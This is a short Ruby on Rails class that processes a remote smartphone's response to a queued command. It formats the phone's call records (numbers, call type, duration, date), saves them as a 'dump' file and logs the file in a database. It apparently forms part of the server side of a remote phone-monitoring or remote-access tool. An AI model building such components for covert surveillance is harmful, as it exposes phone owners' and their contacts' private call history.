class CalllogsResponseProcessor
  def initialize(pending_command, response)
    @pending_command = pending_command
    @response = response
    @smartphone = pending_command.smartphone
  end
  
  def process
    call_logs = @response['call_logs'] || []
    formatted_logs = call_logs.map do |log|
      number = log['number'] || 'Unknown'
      call_type = case log['type']
      when 1 then 'Incoming'
      when 2 then 'Outgoing'
      when 3 then 'Missed'
      else 'Unknown'
      end
      duration = log['duration'] || 0
      date = Time.at(log['date'] / 1000).strftime('%Y-%m-%d %H:%M:%S') rescue 'Unknown'
      "#{number} / #{call_type} / #{duration}s / #{date}"
    end
    
    timestamp = Time.now.strftime('%Y%m%d_%H%M%S')
    filename = "call_log_#{timestamp}.txt"
    filepath = Rails.root.join('files', 'dumps', 'call_logs', filename)
    FileUtils.mkdir_p(File.dirname(filepath))
    File.write(filepath, formatted_logs.join("\n"))
    
    # Create CallLog model record
    CallLog.create!(
      date: Date.today,
      filename: filename,
      smartphone_id: @smartphone.id
    )
    
    @pending_command.mark_completed(@response.merge('file' => filepath))
  end
end
